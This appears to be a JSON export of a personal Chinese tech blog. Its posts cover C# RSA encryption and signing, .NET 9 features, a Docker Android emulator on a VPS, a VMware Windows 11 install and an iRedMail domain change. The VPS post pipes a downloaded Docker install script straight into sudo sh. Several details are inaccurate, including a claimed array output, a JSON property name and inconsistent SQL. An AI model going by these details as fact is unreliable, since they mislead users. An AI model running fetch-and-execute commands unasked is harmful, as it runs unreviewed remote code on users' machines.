{"meta":{"title":"M Study Log","subtitle":"","description":"","author":"m","url":"https://banjinmei.github.io","root":"/"},"pages":[],"posts":[{"title":"RAS加密","slug":"RAS加密","date":"2025-01-21T02:07:25.000Z","updated":"2025-01-21T02:12:26.864Z","comments":true,"path":"2025/01/21/RAS加密/","permalink":"https://banjinmei.github.io/2025/01/21/RAS%E5%8A%A0%E5%AF%86/","excerpt":"","text":"c# RAS C#非对称加密 例子 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758using System;using System.Security.Cryptography;using System.Text;class Program&#123; static void Main(string[] args) &#123; string originalText = &quot;Hello, World!&quot;; // 创建 RSA 算法实例 using (RSA rsa = RSA.Create()) &#123; // 导出公钥 string publicKey = Convert.ToBase64String(rsa.ExportRSAPublicKey()); // 导出私钥 string privateKey = Convert.ToBase64String(rsa.ExportRSAPrivateKey()); // 加密 byte[] encryptedBytes = Encrypt(originalText, publicKey); string encryptedText = Convert.ToBase64String(encryptedBytes); Console.WriteLine($&quot;Encrypted Text: &#123;encryptedText&#125;&quot;); // 解密 string decryptedText = Decrypt(encryptedBytes, privateKey); Console.WriteLine($&quot;Decrypted Text: &#123;decryptedText&#125;&quot;); &#125; &#125; static byte[] Encrypt(string data, string publicKeyString) &#123; // 将公钥从 Base64 字符串转换为字节数组 byte[] publicKeyBytes = Convert.FromBase64String(publicKeyString); using (RSA rsa = RSA.Create()) &#123; // 导入公钥 rsa.ImportRSAPublicKey(publicKeyBytes, out _); // 将数据转换为字节数组 byte[] dataBytes = Encoding.UTF8.GetBytes(data); // 加密数据 return rsa.Encrypt(dataBytes, RSAEncryptionPadding.OaepSHA256); &#125; &#125; static string Decrypt(byte[] encryptedData, string privateKeyString) &#123; // 将私钥从 Base64 字符串转换为字节数组 byte[] privateKeyBytes = Convert.FromBase64String(privateKeyString); using (RSA rsa = RSA.Create()) &#123; // 导入私钥 rsa.ImportRSAPrivateKey(privateKeyBytes, out _); // 解密数据 byte[] decryptedBytes = rsa.Decrypt(encryptedData, RSAEncryptionPadding.OaepSHA256); // 将解密后的字节数组转换为字符串 return Encoding.UTF8.GetString(decryptedBytes); &#125; &#125;&#125; 字符串解密： 123456789101112131415161718192021222324252627282930313233using System;using System.Security.Cryptography;using System.Text;class StringDecryption&#123; static void Main(string[] args) &#123; string encryptedText = &quot;your_encrypted_text_here&quot;; string privateKey = &quot;your_private_key_here&quot;; try &#123; string decryptedText = Decrypt(encryptedText, privateKey); Console.WriteLine($&quot;Decrypted Text: &#123;decryptedText&#125;&quot;); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error during decryption: &#123;ex.Message&#125;&quot;); &#125; &#125; static string Decrypt(string encryptedText, string privateKey) &#123; byte[] encryptedBytes = Convert.FromBase64String(encryptedText); byte[] privateKeyBytes = Convert.FromBase64String(privateKey); using (RSA rsa = RSA.Create()) &#123; rsa.ImportRSAPrivateKey(privateKeyBytes, out _); byte[] decryptedBytes = rsa.Decrypt(encryptedBytes, RSAEncryptionPadding.OaepSHA256); return Encoding.UTF8.GetString(decryptedBytes); &#125; &#125;&#125; 输入的密文和私钥都应该是合法的 Base64 编码字符串，否则 Convert.FromBase64String 会抛出异常。 私钥签名123456789101112131415161718192021222324252627282930313233using System;using System.Security.Cryptography;using System.Text;class SignatureExample&#123; static void Main(string[] args) &#123; string data = &quot;Hello, World!&quot;; string privateKey = &quot;your_private_key_here&quot;; try &#123; byte[] signature = SignData(data, privateKey); Console.WriteLine($&quot;Signature: &#123;Convert.ToBase64String(signature)&#125;&quot;); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error during signing: &#123;ex.Message&#125;&quot;); &#125; &#125; static byte[] SignData(string data, string privateKey) &#123; byte[] dataBytes = Encoding.UTF8.GetBytes(data); byte[] privateKeyBytes = Convert.FromBase64String(privateKey); using (RSA rsa = RSA.Create()) &#123; rsa.ImportRSAPrivateKey(privateKeyBytes, out _); // 使用 RSASignaturePadding.Pkcs1 签名 return rsa.SignData(dataBytes, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1); &#125; &#125;&#125; data：需要签名的数据，这里是一个简单的字符串 “Hello, World!”。privateKey：用于签名的私钥，以 Base64 编码的字符串形式提供。需要将 “your_private_key_here” 替换为实际的私钥。SignData 函数：byte[] dataBytes &#x3D; Encoding.UTF8.GetBytes(data);：将需要签名的数据转换为字节数组，因为签名操作通常是在字节级别进行的。byte[] privateKeyBytes &#x3D; Convert.FromBase64String(privateKey);：将 Base64 编码的私钥转换为字节数组，以便 RSA 算法可以使用。using (RSA rsa &#x3D; RSA.Create())：创建一个 RSA 算法的实例。rsa.ImportRSAPrivateKey(privateKeyBytes, out _);：将私钥导入 RSA 算法实例。return rsa.SignData(dataBytes, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);：使用导入的私钥对数据进行签名。dataBytes：要签名的数据的字节表示。HashAlgorithmName.SHA256：使用 SHA256 算法对数据进行哈希处理。RSASignaturePadding.Pkcs1：使用 PKCS #1 签名填充方案。 使用说明：将 your_private_key_here 替换为自己的 RSA 私钥。程序将对 “Hello, World!” 这个数据进行签名。签名结果将以 Base64 编码的字符串形式输出。运行程序，如果一切正常，将看到生成的签名；如果出现异常，将输出错误消息。请确保私钥的安全性，因为私钥用于生成签名，一旦泄露，签名的安全性将受到威胁。同时，根据需要可以使用不同的哈希算法和签名填充方案，但要确保通信双方使用相同的设置，以保证签名验证的有效性。此外，在实际应用中，可能需要考虑对签名结果进行存储或传输，以及对签名的验证过程，以确保数据的完整性和来源的真实性。以下是一个简单的签名验证示例： 12345678910111213141516171819202122232425262728293031323334using System;using System.Security.Cryptography;using System.Text;class SignatureVerification&#123; static void Main(string[] args) &#123; string data = &quot;Hello, World!&quot;; string publicKey = &quot;your_public_key_here&quot;; string signatureBase64 = &quot;your_signature_here&quot;; try &#123; bool isValid = VerifySignature(data, signatureBase64, publicKey); Console.WriteLine($&quot;Signature is valid: &#123;isValid&#125;&quot;); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error during verification: &#123;ex.Message&#125;&quot;); &#125; &#125; static bool VerifySignature(string data, string signatureBase64, string publicKey) &#123; byte[] dataBytes = Encoding.UTF8.GetBytes(data); byte[] signatureBytes = Convert.FromBase64String(signatureBase64); byte[] publicKeyBytes = Convert.FromBase64String(publicKey); using (RSA rsa = RSA.Create()) &#123; rsa.ImportRSAPublicKey(publicKeyBytes, out _); return rsa.VerifyData(dataBytes, signatureBytes, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1); &#125; &#125;&#125; data：原始数据，用于验证签名是否是对该数据的签名。signatureBase64：需要验证的签名，以 Base64 编码的字符串形式提供。publicKey：用于验证签名的公钥，以 Base64 编码的字符串形式提供。VerifySignature 函数：byte[] dataBytes &#x3D; Encoding.UTF8.GetBytes(data);：将原始数据转换为字节数组。byte[] signatureBytes &#x3D; Convert.FromBase64String(signatureBase64);：将 Base64 编码的签名转换为字节数组。byte[] publicKeyBytes &#x3D; Convert.FromBase64String(publicKey);：将 Base64 编码的公钥转换为字节数组。using (RSA rsa &#x3D; RSA.Create())：创建一个 RSA 算法的实例。rsa.ImportRSAPublicKey(publicKeyBytes, out _);：将公钥导入 RSA 算法实例。return rsa.VerifyData(dataBytes, signatureBytes, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);：使用公钥验证签名。dataBytes：原始数据的字节表示。signatureBytes：要验证的签名的字节表示。HashAlgorithmName.SHA256：使用 SHA256 哈希算法，与签名时使用的哈希算法保持一致。RSASignaturePadding.Pkcs1：使用 PKCS #1 签名填充方案，与签名时使用的填充方案保持一致。 使用说明：将 your_public_key_here 替换为自己的 RSA 公钥。将 your_signature_here 替换为要验证的签名。程序将对签名进行验证，并输出验证结果。运行程序，如果签名有效，将输出 Signature is valid: true；否则，将输出 Signature is valid: false 或错误消息。确保公钥和签名的完整性，以及使用与签名时相同的哈希算法和填充方案，这样才能正确验证签名的有效性。 公钥加密 私钥解密私钥签名 公钥验证 TEST123456789101112131415161718192021222324252627282930313233343536373839404142434445string originalText = &quot;Hello, World!&quot;;// 创建 RSA 算法实例using (RSA rsa = RSA.Create())&#123; // 导出公钥 string publicKey = Convert.ToBase64String(rsa.ExportRSAPublicKey()); // 导出私钥 string privateKey = Convert.ToBase64String(rsa.ExportRSAPrivateKey()); Console.WriteLine(&quot;publicKey \\n&quot; + publicKey + &quot;\\n&quot;); Console.WriteLine(&quot;priKey &quot; + privateKey + &quot;\\n&quot;); string key1 = &quot;MxBase64&quot;; string sclientstr = &quot;aIQ==&quot;; string key2 = &quot;MIB64Cv+&quot;; // 加密 byte[] encryptedBytes = RSAHelper.RSAEncrypt(originalText, publicKey); string encryptedText = Convert.ToBase64String(encryptedBytes); Console.WriteLine($&quot;Encrypted Text: &#123;encryptedText&#125;&quot;); // 解密 string decryptedText = RSAHelper.RSADecrypt(encryptedBytes, privateKey); Console.WriteLine($&quot;Decrypted Text: &#123;decryptedText&#125;&quot;); // 解密2 string decryptedText2 = RSAHelper.RSADecryptS(sclientstr, key2); Console.WriteLine($&quot;Decrypted Text2: &#123;decryptedText2&#125;&quot;); // //key string keyim = ConfigManager.Temp1; //aes 加密 string encrypted = Aesv1.Encrypt(&quot;1234567890A2&quot;, keyim);// decryptedText2);//keyim Console.WriteLine($&quot;encrypted &#123;encrypted&#125;&quot;); //byte[] encrypted2 = RSAHelper.RSAEncrypt(&quot;1234567890A2&quot;, decryptedText2); //string encryptedText2 = Convert.ToBase64String(encrypted2);// //Console.WriteLine($&quot;encrypted2 &#123;encryptedText2&#125;&quot;); //签名 string signStr = RSAHelper.RSASignDataS(encrypted, key2); Console.WriteLine(&quot;encrypted 1111111111111 &quot;+ signStr);&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"c#","slug":"c","permalink":"https://banjinmei.github.io/tags/c/"},{"name":"ras","slug":"ras","permalink":"https://banjinmei.github.io/tags/ras/"}],"author":"mu"},{"title":".NET9 lock Aspire UUID JsonSerializerOptions","slug":"NET9-lock-Aspire-UUID-JsonSerializerOptions","date":"2025-01-01T16:05:49.000Z","updated":"2025-01-01T16:12:10.880Z","comments":true,"path":"2025/01/02/NET9-lock-Aspire-UUID-JsonSerializerOptions/","permalink":"https://banjinmei.github.io/2025/01/02/NET9-lock-Aspire-UUID-JsonSerializerOptions/","excerpt":"","text":".NET9迄今为止最高效、最现代、最安全、最智能、性能最高的.NET版本 12dotnet --list-sdks# 指令查看是否以安装.NET9。 下载.NET9 SDK安装 or IDE Visual Studio 更新 Lock引入 System.Threading.Lock 是 .NET 提供的一个更优雅的锁定机制，可以替代传统的基于 Monitor 的锁定方式。以下是新锁定机制的特点及示例代码： 1234567891011121314151617181920212223242526272829303132333435363738using System;using System.Threading;class Program&#123; private static readonly Lock _lock = new(); static void Main() &#123; // 使用新锁定机制 using (_lock.EnterScope()) &#123; Console.WriteLine(&quot;这是线程安全的代码块&quot;); // 在这里执行线程安全的操作 &#125; // 演示多线程场景 Thread thread1 = new(() =&gt; AccessResource(&quot;线程1&quot;)); Thread thread2 = new(() =&gt; AccessResource(&quot;线程2&quot;)); thread1.Start(); thread2.Start(); thread1.Join(); thread2.Join(); &#125; static void AccessResource(string threadName) &#123; using (_lock.EnterScope()) &#123; Console.WriteLine($&quot;&#123;threadName&#125; 正在访问共享资源...&quot;); Thread.Sleep(1000); // 模拟一些操作 Console.WriteLine($&quot;&#123;threadName&#125; 完成访问&quot;); &#125; &#125;&#125; 定义锁对象： 1private static readonly Lock _lock = new(); Lock 类型专门用于实现锁定，比 object 更清晰和安全。进入锁定范围：using (_lock.EnterScope())EnterScope 返回一个 ref struct，它在离开作用域时自动释放锁。多线程场景：多个线程尝试访问共享资源，通过 using 确保代码块是线程安全的。优势避免传统 Monitor.Enter 和 Monitor.Exit 的繁琐代码及潜在的错误。自动释放锁，减少资源泄漏的风险。类型安全的设计避免了在异步场景中的误用。注意事项Lock.EnterScope 返回 ref struct，因此它不能被捕获或在异步方法中使用。Lock 是不可复制的，确保锁的独占性和安全性。这是一个更现代化的线程同步方式，非常适合在新项目中使用。 更安全、更高效。 可以和using一起使用 .NET Aspire - Blazor Web Web API可以选择使用 Redis 进行缓存 测试项目 https://learn.microsoft.com/zh-cn/dotnet/aspire/https://github.com/communitytoolkit/aspirehttps://learn.microsoft.com/zh-cn/dotnet/aspire/whats-new/dotnet-aspire-9?tabs=windows 对比.NET8 ,.NET9 多了 vue recat angular web项目 UUID v7我们经常在实体中使用Guid作为主键，并且通过Guid.NewGuid()可以很方便的生成一个新的Guid，而此方法生成的Guid是依据UUID第四个版本规范生成的。 当前已经可以通过Guid.CreateVersion7()方法创建UUID第七个版本，这个版本UUID主要功能就是包含了时间戳，数据结构如下： | 48位时间戳 | 12位随机 | 62位随机 | 这也意味着v7版本的UUID可以按时间排序了，在数据库中使用起来更方便，同时Guid.CreateVersion7()方法还有一个重载方法接收DateTimeOffset类型时间戳，用来通过指定时间创建UUID。 12345678910// v4 UUIDvar guid_v4 = Guid.NewGuid();// v7 UUIDvar guid_v7 = Guid.CreateVersion7();// v7 UUID with timestampvar guid_v7_time = Guid.CreateVersion7(TimeProvider.System.GetLocalNow());Console.WriteLine(guid_v4);Console.WriteLine(guid_v7);Console.WriteLine(guid_v7_time); \\e在 C# 中，随着新的转义序列 \\e 的引入，开发者可以更方便地表示 Unicode 字符 U+001B (ESCAPE 字符)。以下是一些代码示例，展示如何使用新的转义序列 \\e 和传统方式的区别。 12345678910111213141516171819202122232425262728using System;class Program&#123; static void Main() &#123; // 使用新的转义序列 \\e string newEscapeSequence = &quot;\\e[31mHello, World!\\e[0m&quot;; // ANSI 转义代码：红色文本 Console.WriteLine(&quot;Using \\\\e:&quot;); Console.WriteLine(newEscapeSequence); // 使用旧的方式 \\u001b string oldUnicodeEscape = &quot;\\u001b[31mHello, World!\\u001b[0m&quot;; // ANSI 转义代码：红色文本 Console.WriteLine(&quot;Using \\\\u001b:&quot;); Console.WriteLine(oldUnicodeEscape); // 使用旧的方式 \\x1b string oldHexEscape = &quot;\\x1b[31mHello, World!\\x1b[0m&quot;; // ANSI 转义代码：红色文本 Console.WriteLine(&quot;Using \\\\x1b:&quot;); Console.WriteLine(oldHexEscape); // 注意：\\x1b 后可能意外包含后续的有效十六进制字符 string potentialIssue = &quot;\\x1b7Hello&quot;; // 可能被解析为 \\x1b7 而不是单独的 \\x1b Console.WriteLine(&quot;Potential issue with \\\\x1b:&quot;); Console.WriteLine(potentialIssue); &#125;&#125; 推荐使用 \\e：它更简洁并且没有可能的歧义。避免使用 \\x1b：如果后续字符是十六进制数字，可能导致意外结果。例如，\\x1b7 会被解析为一个字符，而不是 ESC 字符后跟 7。向后兼容：C# 仍然支持 \\u001b 和 \\x1b，但建议逐步迁移到 \\e。新的转义序列 \\e 提高了代码可读性和安全性，特别是在处理 ANSI 转义序列时。 以下是一些更丰富的示例，展示如何使用新的 \\e 转义序列，以及如何在各种场景中替代旧的方式。 示例 1: 控制台中的颜色切换1234567891011121314151617using System;class Program&#123; static void Main() &#123; // 使用 \\e 转义序列来改变文字颜色 string redText = &quot;\\e[31mThis is red text\\e[0m&quot;; // 红色文本 string greenText = &quot;\\e[32mThis is green text\\e[0m&quot;; // 绿色文本 string yellowText = &quot;\\e[33mThis is yellow text\\e[0m&quot;; // 黄色文本 Console.WriteLine(redText); Console.WriteLine(greenText); Console.WriteLine(yellowText); &#125;&#125; 示例 2: 带有光标移动的控制台输出123456789101112131415161718using System;class Program&#123; static void Main() &#123; // 使用 \\e 来控制光标位置 string moveCursorUp = &quot;\\e[1A&quot;; // 光标上移 1 行 string moveCursorDown = &quot;\\e[1B&quot;; // 光标下移 1 行 string moveCursorRight = &quot;\\e[10C&quot;; // 光标右移 10 列 Console.WriteLine(&quot;Line 1&quot;); Console.WriteLine(&quot;Line 2&quot;); Console.WriteLine(moveCursorUp + &quot;Moved Up&quot;); Console.WriteLine(moveCursorRight + &quot;Moved Right&quot;); &#125;&#125; 示例 3: 格式化多种样式1234567891011121314151617using System;class Program&#123; static void Main() &#123; // 使用 ANSI 转义序列来混合样式 string boldAndRed = &quot;\\e[1;31mBold and Red Text\\e[0m&quot;; // 粗体 + 红色 string underlineAndGreen = &quot;\\e[4;32mUnderline and Green Text\\e[0m&quot;; // 下划线 + 绿色 string inverted = &quot;\\e[7mInverted Colors\\e[0m&quot;; // 反转颜色 Console.WriteLine(boldAndRed); Console.WriteLine(underlineAndGreen); Console.WriteLine(inverted); &#125;&#125; 示例 4: 清屏和隐藏光标123456789101112131415161718192021using System;class Program&#123; static void Main() &#123; // 使用 \\e 控制控制台清屏和隐藏光标 string clearScreen = &quot;\\e[2J&quot;; // 清屏 string hideCursor = &quot;\\e[?25l&quot;; // 隐藏光标 string showCursor = &quot;\\e[?25h&quot;; // 显示光标 Console.WriteLine(&quot;This will be cleared...&quot;); Console.WriteLine(clearScreen + &quot;Screen Cleared!&quot;); Console.WriteLine(hideCursor + &quot;Cursor Hidden!&quot;); Console.WriteLine(&quot;Press Enter to show cursor again...&quot;); Console.ReadLine(); Console.WriteLine(showCursor + &quot;Cursor Visible!&quot;); &#125;&#125; 示例 5: 动态加载进度条123456789101112131415161718192021using System;using System.Threading;class Program&#123; static void Main() &#123; string progressBarTemplate = &quot;\\e[32m[####################]\\e[0m&quot;; string clearLine = &quot;\\e[2K\\r&quot;; for (int i = 0; i &lt;= 20; i++) &#123; string progress = new string(&#x27;#&#x27;, i) + new string(&#x27; &#x27;, 20 - i); Console.Write(clearLine + $&quot;\\e[32m[&#123;progress&#125;]\\e[0m &#123;i * 5&#125;%&quot;); Thread.Sleep(200); // 模拟任务处理时间 &#125; Console.WriteLine(&quot;\\nDone!&quot;); &#125;&#125; 示例总结颜色：用 \\e 定义颜色文本非常方便。光标控制：\\e 可用来实现光标的移动、隐藏和显示。混合样式：支持多种样式组合，比如粗体、下划线和颜色。屏幕操作：清屏、隐藏光标等功能大幅提高了终端交互的灵活性。动态效果：用 \\e 创建进度条、动态输出等非常直观。 索引运算符 隐式“从末尾开始”索引运算符 ^，需要按照以下步骤操作。以下是完整的用法指南： 前置条件环境要求：C# 8.0 或更高版本。.NET Core 3.0 或更高版本，或 .NET Framework 支持的版本。buffer 属性要求：buffer 必须是支持索引器的类型，例如数组 (T[])、列表 (List) 或其他实现了 IList 的集合类型。 代码示例1. 使用数组1234567891011121314151617181920212223242526272829using System;class S&#123; public int[] buffer = new int[10]; // 定义一个大小为10的数组&#125;class Program&#123; static void Main() &#123; var v = new S() &#123; buffer = &#123; [^1] = 0, // 倒数第1个元素设置为 0 [^2] = 1, // 倒数第2个元素设置为 1 [^3] = 2, // 倒数第3个元素设置为 2 [^4] = 3, // 倒数第4个元素设置为 3 [^5] = 4 // 倒数第5个元素设置为 4 &#125; &#125;; // 输出结果 Console.WriteLine(string.Join(&quot;, &quot;, v.buffer)); // 输出: 0, 0, 0, 0, 4, 3, 2, 1, 0, 0 &#125;&#125; 2. 使用 List如果 buffer 是一个 List，可以这样初始化： 123456789101112131415161718192021222324252627282930using System;using System.Collections.Generic;class S&#123; public List&lt;int&gt; buffer = new List&lt;int&gt;(new int[10]); // 初始化为10个元素&#125;class Program&#123; static void Main() &#123; var v = new S() &#123; buffer = &#123; [^1] = 0, [^2] = 1, [^3] = 2, [^4] = 3, [^5] = 4 &#125; &#125;; // 输出结果 Console.WriteLine(string.Join(&quot;, &quot;, v.buffer)); // 输出: 0, 0, 0, 0, 4, 3, 2, 1, 0, 0 &#125;&#125; JSONJsonSerializerOptions 缩进选项 ，可支持自定义写入 JSON 的缩进字符和缩进大小。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748var options = new JsonSerializerOptions&#123; WriteIndented = true, IndentCharacter = &#x27;\\t&#x27;, IndentSize = 2,&#125;;string json = JsonSerializer.Serialize( new &#123; Value = 1 &#125;, options );Console.WriteLine(json);var data = new&#123; Name = &quot;Alice&quot;, Age = 30, Skills = new[] &#123; &quot;C#&quot;, &quot;ASP.NET Core&quot;, &quot;Blazor&quot; &#125;&#125;;// 默认缩进格式var defaultOptions = new JsonSerializerOptions&#123; WriteIndented = true&#125;;Console.WriteLine(&quot;默认格式:&quot;);Console.WriteLine(JsonSerializer.Serialize(data, defaultOptions));// 使用自定义缩进字符（制表符）和大小var customOptions = new JsonSerializerOptions&#123; WriteIndented = true, IndentCharacter = &#x27;\\t&#x27;, // 使用制表符 IndentSize = 1 // 每层缩进 1 个制表符&#125;;Console.WriteLine(&quot;\\n自定义制表符缩进:&quot;);Console.WriteLine(JsonSerializer.Serialize(data, customOptions));// 使用自定义空格缩进var customSpaceOptions = new JsonSerializerOptions&#123; WriteIndented = true, IndentCharacter = &#x27; &#x27;, // 使用空格 IndentSize = 4 // 每层缩进 4 个空格&#125;;Console.WriteLine(&quot;\\n自定义空格缩进:&quot;);Console.WriteLine(JsonSerializer.Serialize(data, customSpaceOptions)); 结果{ “Value”: 1}默认格式:{ “Name”: “Alice”, “Age”: 30, “Skills”: [ “C#”, “ASP.NET Core”, “Blazor” ]} 自定义制表符缩进:{ “Name”: “Alice”, “Age”: 30, “Skills”: [ “C#”, “ASP.NET Core”, “Blazor” ]} 自定义空格缩进:{ “Name”: “Alice”, “Age”: 30, “Skills”: [ “C#”, “ASP.NET Core”, “Blazor” ]} JsonSerializerOptions新增了对自定义 JSON 缩进字符和缩进大小的支持。这项特性主要通过两个新属性实现： IndentChars: 指定用于缩进的字符（默认为空格 “ “）。IndentSize: 指定缩进的大小（默认为 2）。这些属性让开发者灵活控制 JSON 格式，适配不同需求： 日志优化: 提高可读性，便于结构定位。前端适配: 符合框架缩进要求。空间节约: 减少 JSON 体积。工具兼容: 满足外部格式要求。 JsonSerializerOptions.Web是一个新的单例实例，专为 Web 应用程序设计，提供了默认的 JSON 序列化选项。它的主要特点包括： 属性命名策略：将属性名称从 PascalCase 转换为 camelCase，以符合 JavaScript 的命名惯例。 忽略默认值：在序列化过程中，忽略属性的默认值（如 null、0、false），以减少传输的数据量。 数字处理：允许从字符串读取数字，以提高灵活性。 这些默认设置使得在 Web 环境中进行 JSON 序列化时，无需手动配置即可获得符合 Web 标准的输出。 1234567891011121314151617181920public class Product&#123; public int Id &#123; get; set; &#125; public string Name &#123; get; set; &#125; = &quot;P1-DWD1&quot;; public decimal Price &#123; get; set; &#125; = 0.0m; // 默认值 public string? Description &#123; get; set; &#125; = null; // 可空类型&#125;public class Program&#123; static void Main(string[] args) &#123; var product = new Product(); // 使用 JsonSerializerOptions.Web 进行序列化 string json = JsonSerializer.Serialize(product, JsonSerializerOptions.Web); Console.WriteLine(json); &#125;&#125; {“id”:0,”name”:”P1-DWD1”,”price”:0.0,”description”:null} Debian .NET912345wget https://download.visualstudio.microsoft.com/download/pr/xxx/dotnet-sdk-9.0.0.debsudo dpkg -i dotnet-sdk-9.0.0.debsudo apt-get install -f # 如果有依赖问题dotnet --version","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net9","slug":"net9","permalink":"https://banjinmei.github.io/tags/net9/"}],"author":"mu"},{"title":"vps cloud mobile","slug":"vps-cloud-mobile","date":"2025-01-01T16:00:38.000Z","updated":"2025-01-01T16:03:27.039Z","comments":true,"path":"2025/01/02/vps-cloud-mobile/","permalink":"https://banjinmei.github.io/2025/01/02/vps-cloud-mobile/","excerpt":"","text":"vps cloud mobileVPS云服务器搭建云手机教程 首先检查自己vps是否支持这个项目123sudo apt install cpu-checkerkvm-ok 123INFO: /dev/kvm existsKVM acceleration can be used 表示支持，可以继续往下看 ac13 安装docker1curl -fsSL https://get.docker.com | sudo sh 然后就是直接引用大佬的项目了（感谢budtmo大佬的分享） 12docker run -d -p 29898:6080 -e EMULATOR_DEVICE=&quot;Samsung Galaxy S10&quot; -e WEB_VNC=true -e VNC_PASSWORD=nodeseek --device /dev/kvm --name android-container budtmo/docker-android:emulator_11.0 其中，上面的代码29898可以改成自己想要的端口nodeseek改成自己想要的密码budtmo&#x2F;docker-android:emulator_11.0，可以选择安卓9.0到13.0（根据自己的vps配置，直接改最后面的数字）Samsung Galaxy S10可以根据自己的配置选择自己想要的机型，设备名单具体见下表 种类 设备名称 1234567891011Phone Samsung Galaxy S10Phone Samsung Galaxy S9Phone Samsung Galaxy S8Phone Samsung Galaxy S7 EdgePhone Samsung Galaxy S7Phone Samsung Galaxy S6Phone Nexus 4Phone Nexus 5Phone Nexus OnePhone Nexus STablet Nexus 7 运行完成后，打开浏览器，地址栏输入IP：端口 即可访问了！","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"vps","slug":"vps","permalink":"https://banjinmei.github.io/tags/vps/"}],"author":"mu"},{"title":"vmware install win11","slug":"vmware-install-win11","date":"2024-12-25T17:01:25.000Z","updated":"2024-12-25T17:27:40.521Z","comments":true,"path":"2024/12/26/vmware-install-win11/","permalink":"https://banjinmei.github.io/2024/12/26/vmware-install-win11/","excerpt":"","text":"VMware安装win11新建虚拟机稍后安装系统 右键 电源 进入固件出现 无法连接虚拟设备 sata0：1，因为主机上没用相应设备设备-启动时连接 取消打钩 右键 可移动设备 - U盘连接 进入PE打开DG 右键转为GUID 保存更改 顶部空闲右键 创建ESP分区空间建立新分区 系统分区 DSaveESP右键 指定新的驱动器-盘符 F 建立分区保存格式化 一键装机!注意目标分区D&#x2F;引导分区F 安装完重启后 右键 可移动设备 - U盘断开引导安装 END","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"vm","slug":"vm","permalink":"https://banjinmei.github.io/tags/vm/"},{"name":"win11","slug":"win11","permalink":"https://banjinmei.github.io/tags/win11/"}],"author":"mu"},{"title":"update domain 4 iRedMail","slug":"update-domain-4-iRedMail","date":"2024-12-21T15:20:53.000Z","updated":"2024-12-21T15:26:34.985Z","comments":true,"path":"2024/12/21/update-domain-4-iRedMail/","permalink":"https://banjinmei.github.io/2024/12/21/update-domain-4-iRedMail/","excerpt":"","text":"更换 iRedMail 的域名（如从 mail.example.com 更换为 mail.mydomain.com），需要修改多个配置文件和数据库记录，并确保新的域名配置正确。以下是操作步骤： 步骤 1：更新 DNS 记录在域名托管平台更新 mail.mydomain.com 的 DNS 记录：A记录：指向邮件服务器的 IP 地址。MX记录：指向 mail.mydomain.com。SPF 记录：确保包括新的域名。DKIM 和 DMARC 记录：重新生成并更新。确保 DNS 更改后可以通过 dig 或 nslookup 验证生效。 步骤 2：更新主机名修改主机名： 12 hostnamectl set-hostname mail.mydomain.com 更新 &#x2F;etc&#x2F;hosts 文件： 12127.0.0.1 localhost127.0.1.1 mail.mydomain.com mail 更新 &#x2F;etc&#x2F;mailname 文件： 1mail.mydomain.com 步骤 3：更新 iRedMail 配置文件修改 Postfix 配置： 编辑 &#x2F;etc&#x2F;postfix&#x2F;main.cf： 1234myhostname = mail.mydomain.commydomain = mydomain.commyorigin = $mydomain 重启 Postfix： 1systemctl restart postfix 修改 Dovecot 配置： 编辑 &#x2F;etc&#x2F;dovecot&#x2F;dovecot.conf 和 &#x2F;etc&#x2F;dovecot&#x2F;conf.d&#x2F;10-mail.conf，确保更新主机名： 12ssl_cert = &lt;/etc/ssl/certs/mail.igrmail.pics.crtssl_key = &lt;/etc/ssl/private/mail.igrmail.pics.key 重启 Dovecot： 1systemctl restart dovecot 修改 Amavisd 配置： 编辑 &#x2F;etc&#x2F;amavis&#x2F;conf.d&#x2F;50-user： 1$myhostname = &#x27;mail.mydomain.com&#x27;; 重启 Amavisd： 12 systemctl restart amavis 修改 iRedAdmin 配置： 编辑 &#x2F;opt&#x2F;www&#x2F;iredadmin&#x2F;settings.py： 1web_hostname = &#x27;mail.igrmail.pics&#x27; 重启 iRedAdmin： 1systemctl restart iredadmin 步骤 4：更新数据库记录使用以下命令登录数据库（通常是 MySQL&#x2F;MariaDB）： 1mysql -u root -p 更新 vmail 数据库中的域名： 12345 USE vmail;UPDATE domain SET domain=&#x27;new&#x27; WHERE domain=&#x27;old&#x27;;UPDATE alias SET address=REPLACE(address, &#x27;old&#x27;, &#x27;@new&#x27;);UPDATE mailbox SET username=REPLACE(username, &#x27;@old&#x27;, &#x27;@new&#x27;); 步骤 5：重新生成 SSL 证书如果你使用 Let’s Encrypt： 12 certbot --apache -d mail.xxx 将新生成的证书路径更新到相关服务的配置文件中（如 Postfix、Dovecot）。 步骤 6：重启所有相关服务确保所有服务都重启以加载新的配置： 12 systemctl restart postfix dovecot amavis clamav spamassassin iredapd iredadmin 步骤 7：验证配置检查服务状态： 1systemctl status postfix dovecot amavis 发送和接收测试邮件，确保新域名能正常工作。验证 MX、SPF、DKIM 和 DMARC 记录是否正确。完成这些步骤后，你的邮件服务器将会切换到新的域名。 debian 安装 MariaDB在Debian系统上安装MariaDB，你可以按照以下步骤操作： 更新系统包列表： sudo apt update安装MariaDB服务器： sudo apt install mariadb-server安全设置MariaDB，包括设置root密码和删除匿名用户： sudo mysql_secure_installation启动MariaDB服务： sudo systemctl start mariadb使MariaDB服务在系统启动时自动运行： sudo systemctl enable mariadb登录MariaDB以确保一切正常： sudo mysql -u root -p当系统提示输入密码时，输入你在安全设置步骤中设置的密码。 以上步骤将在Debian系统上安装MariaDB，并确保其安全和自动启动。 连接MariaDB (like mysql)SHOW DATABASES;SHOW 